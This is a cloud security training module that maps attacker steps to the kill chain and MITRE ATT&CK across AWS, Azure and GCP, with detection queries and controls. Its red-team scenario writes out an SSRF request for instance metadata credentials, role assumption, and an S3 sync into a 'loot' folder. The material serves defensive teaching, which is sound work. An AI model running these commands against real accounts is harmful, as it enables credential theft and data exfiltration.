# 03 — Kill Chain & Attack Mapping

> **Level:** Fundamental
> **Prereqs:** 01-shared-responsibility, 02-cia-triad-in-cloud
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** All cloud-matrix tactics
> **Authorization scope:** Paper exercise only. No real attack execution. Use placeholder accounts for any code examples.

## What & why
Mapping attacker actions to a structured kill chain lets defenders place controls at choke points rather than reacting ad-hoc ("we bought a WAF"). Cloud collapses the classic linear chain — no "install malware" when you can just call `AssumeRole`.

## The OnPrem reality

Lockheed Martin Cyber Kill Chain (classic, linear):

```
Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives
```

In on-prem terms:
- **Recon:** Port scan `10.0.0.0/8`, LinkedIn scrape IT staff.
- **Weaponize:** Craft a malicious Office doc with macro.
- **Deliver:** Email attachment to sysadmin.
- **Exploit:** User opens doc, macro executes.
- **Install:** Drops RAT, persists via registry Run key.
- **C2:** Beacons out to attacker-controlled domain over HTTPS.
- **Actions:** Dump `ntds.dit`, exfil via SMB.

In cloud, many steps collapse:
- No "installation" — just `CreateRole`, `AttachUserPolicy`, or `iam:PassRole`.
- No "weaponize/deliver" — just a public SSRF endpoint that hits IMDS.
- C2 is often outbound HTTPS to a cloud API endpoint (hard to distinguish from normal cloud traffic).

## Core concepts

### MITRE ATT&CK terminology

| Term | Definition | Cloud example |
|------|------------|---------------|
| **Tactic** | The adversary's goal (the "why") | Persistence, Privilege Escalation, Exfiltration |
| **Technique** | How they achieve the goal | `CreateAccessKey` for Persistence |
| **Sub-technique** | Specific variant | `CreateAccessKey` for an IAM user vs `sts:AssumeRole` |
| **Procedure** | The exact series of commands an actor uses | A specific tool's sequence of API calls |

### Tactics mapped to concrete cloud actions

| ATT&CK Tactic | AWS example | Azure example | GCP example |
|---------------|-------------|---------------|-------------|
| Initial Access | SSRF → IMDS credential theft, public S3 w/ creds | SSRF → Azure IMDS, compromised SAS token | SSRF → metadata server, leaked service account key |
| Execution | `ec2:RunInstances` w/ user-data script, Lambda invoke | VM run command, Function App trigger | `gcloud compute ssh`, Cloud Run deployment |
| Persistence | `iam:CreateAccessKey`, `iam:CreateLoginProfile`, Lambda scheduled event | Entra ID app registration + client secret, Automation Account runbook | `iam.serviceAccounts.createKey`, Cloud Scheduler job |
| Privilege Escalation | `iam:PassRole`, `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole` | Azure RBAC `Microsoft.Authorization/roleAssignments/write`, Managed Identity abuse | `iam.serviceAccounts.setIamPolicy`, `resourcemanager.projects.setIamPolicy` |
| Defense Evasion | CloudTrail `StopLogging`, `s3:DeleteBucketPolicy` (for CloudTrail S3), disable GuardDuty | Azure Sentinel workspace delete, disable Defender for Cloud | Cloud Audit Logs disable, delete log sinks |
| Credential Access | IMDSv1 scrape, SSM parameter store read, Secrets Manager `GetSecretValue` | Azure IMDS token fetch, Key Vault read | Metadata server token, Secret Manager `access` |
| Discovery | `GetCallerIdentity`, `ListBuckets`, `DescribeInstances` | `az account show`, `az resource list` | `gcloud auth list`, `gcloud projects list` |
| Lateral Movement | `ssm:SendCommand` to other instances, cross-account `AssumeRole` | `Invoke-AzVMRunCommand`, cross-subscription RBAC | OS Login to other instances, cross-project IAM |
| Collection | S3 `GetObject`, RDS snapshot share, DynamoDB scan | Blob `GetBlob`, Cosmos DB query | GCS object download, BigQuery query |
| Exfiltration | S3 `GetObject` to external IP, `ec2:CreateSnapshot` + share | Blob SAS URL generation, VM snapshot to attacker storage | GCS signed URL, BigQuery extract job |
| Impact | `ec2:DeleteSnapshot`, `s3:DeleteBucket`, `rds:DeleteDBInstance` | Resource group delete, VM delete, storage account delete | `gcloud compute instances delete`, `gcloud storage rm -r` |

## 🔴 Red Team view

### End-to-end contained scenario — Cloud Kill Chain

**Scenario:** A public-facing web app on EC2 has an SSRF vulnerability. Attacker proceeds through the chain. All values are placeholders. Run only in your own sandbox.

```
RECONNAISSANCE
├── Attacker enumerates public DNS: `dig +short app-111111111111.us-east-1.elb.amazonaws.com`
├── Identifies the ALB hostname; sends benign HTTP probes
└── Finds a /proxy?url= endpoint (SSRF vector)

INITIAL ACCESS
├── curl -s 'http://app-111111111111.us-east-1.elb.amazonaws.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ssrf-role'
├── Retrieves AccessKeyId + SecretAccessKey + Token for ec2 instance role
└── Artifact: CloudTrail No logs— IMDS access is not an AWS API call. VPC Flow Logs show connection to 169.254.169.254.

EXECUTION / DISCOVERY
├── export AWS_ACCESS_KEY_ID=ASIAEXAMPLE...
├── aws sts get-caller-identity  # "whoami"
├── aws s3 ls                     # enumerate buckets
├── aws iam list-roles            # what can this role do?
└── Artifact: CloudTrail records GetCallerIdentity, ListBuckets, ListRoles from the instance-role principal.

PRIVILEGE ESCALATION
├── Attacker discovers the role has iam:PassRole and sts:AssumeRole on "admin-stage"
├── aws sts assume-role --role-arn arn:aws:iam::111111111111:role/admin-stage --role-session-name debug
├── Now operating with AdminStage permissions (read production data)
└── Artifact: CloudTrail records AssumeRole. sourceIpAddress is the EC2 instance IP.

COLLECTION
├── aws s3 sync s3://internal-data-111111111111/ ./loot/
└── Artifact: CloudTrail data events (if enabled) record GetObject for each S3 object. S3 server access logs.

EXFILTRATION (contained — data stays on localhost)
├── python3 -c "import http.server; http.server.HTTPServer(('localhost', 9000), lambda *a: None)"
├── curl -X POST -T ./loot/placeholder.txt http://localhost:9000/
└── STOP: No real exfiltration. Artifact: VPC Flow Logs show outbound to suspicious port.
```

**Artifacts summary per tactic:**

| Tactic | Artifact left |
|--------|--------------|
| Reconnaissance | ALB access logs (normal traffic) |
| Initial Access | VPC Flow Logs → 169.254.169.254 TCP/80 |
| Discovery | CloudTrail: GetCallerIdentity, ListBuckets, ListRoles |
| Privilege Escalation | CloudTrail: AssumeRole with unusual role-session-name |
| Collection | CloudTrail data events: S3 GetObject surge |
| Exfiltration | VPC Flow Logs: outbound to unusual port/IP |

## 🔵 Blue Team view

### Per-tactic detection signals — same chain, all three clouds

| Tactic | AWS Signal | Azure Signal | GCP Signal |
|--------|-----------|--------------|------------|
| Reconnaissance | ALB access logs (baseline noise) | App Gateway logs | Cloud Load Balancing logs |
| Initial Access (IMDS SSRF) | VPC Flow Logs: src=instance, dst=169.254.169.254:80 (IMDSv1 token-less) | NSG Flow Logs: dst=169.254.169.254, Metadata: true header absent or token-less | VPC Flow Logs: dst=metadata.google.internal, no Metadata-Flavor header |
| Discovery | CloudTrail: `GetCallerIdentity` spike, `ListBuckets` from a role that never called it before | Activity Log: `Microsoft.Resources/subscriptions/resourceGroups/read` enumeration | Cloud Audit Logs: `google.cloud.storage.buckets.list` from unexpected SA |
| Privilege Escalation | CloudTrail: `AssumeRole` where source identity != expected caller chain | Azure AD: `Microsoft.Storage/storageAccounts/listKeys/action` anomaly | Audit Logs: `iam.serviceAccounts.setIamPolicy` or `sts` token exchange |
| Collection | GuardDuty `Exfiltration:S3/AnomalousBehavior`, CloudTrail data event spike | Defender for Cloud: unusual data access patterns, Sentinel UEBA | Event Threat Detection: `Exfil:gcs`, anomalous log bucket reads |
| Exfiltration | GuardDuty `Exfiltration:S3/AnomalousBehavior`, VPC Flow Logs to uncommon port/IP | NSG Flow Logs + Microsoft Sentinel anomalous egress | VPC Flow Logs + Event Threat Detection exfil findings |

### Preventive choke points

| Tactic | Preventive control |
|--------|-------------------|
| Initial Access | IMDSv2 enforced (HttpTokens=required). Azure: disable IMDS or use Private Link. GCP: restrict metadata server access via shielded VMs. |
| Discovery | IAM policy scoped to deny `List*` / `Describe*` outside approved roles. |
| Privilege Escalation | KMS condition keys on `AssumeRole` (only from specific source ARNs). SCP deny `iam:PassRole` unless to a known-role whitelist. |
| Collection | S3 / Storage bucket policies restrict read to specific VPC endpoints (SourceVpc). Data-perimeter controls. |
| Exfiltration | SCP deny `s3:PutObject` when `aws:SourceIp` not internal. VPC egress only through inspection proxy. |

### Sample detection queries

```sql
-- AWS CloudTrail: Detect AssumeRole from suspicious session names
SELECT eventTime, userIdentity.arn, sourceIPAddress, requestParameters.roleSessionName
FROM cloudtrail_logs
WHERE eventName = 'AssumeRole'
  AND requestParameters.roleSessionName NOT IN ('ScheduledAudit', 'CICD-Pipeline', 'OktaSSO')
  AND date(eventTime) >= current_date - interval '1' day

-- Azure: Anomalous IMDS token activity
AzureActivity
| where OperationName == "List Storage Account Keys"
| where CallerIpAddress matches regex "10\\..*"
| join kind=inner (SigninLogs | where AppId == "") on $left.Caller == $right.UserPrincipalName
```

## Hands-on lab

Build a **paper kill-chain diagram** for your own sandbox environment:

1. List every resource in your sandbox (EC2, RDS, S3, Lambda, etc.).
2. For each resource, map the attack tactic that could compromise it (e.g., "RDS → Credential Access (snapshot restore to attacker account)").
3. At each cross-point (tactic × resource), write the log source you'd query to detect it.
4. Draw the diagram as a flowchart: resource → tactic → detection signal.
5. Identify the single biggest gap (tactic with no detection signal in your current setup).

Submit as a PDF, draw.io diagram, or plaintext Mermaid graph.

## Detection rules & checklists

- [ ] CloudTrail enabled in all regions, organization-wide.
- [ ] CloudTrail data events enabled for S3 buckets containing sensitive data.
- [ ] VPC Flow Logs enabled on all VPCs, sent to S3/CloudWatch.
- [ ] GuardDuty / Defender for Cloud / Event Threat Detection enabled.
- [ ] IMDSv2 enforced on all EC2 instances.
- [ ] No security group allows inbound 0.0.0.0/0 to anything except 80/443.
- [ ] AssumeRole events reviewed weekly for unexpected source/role-session-name values.

## References
- MITRE ATT&CK Enterprise + Cloud matrices: https://attack.mitre.org/matrices/enterprise/cloud/
- Lockheed Martin Cyber Kill Chain paper
- "Pyramid of Pain" — David J. Bianco
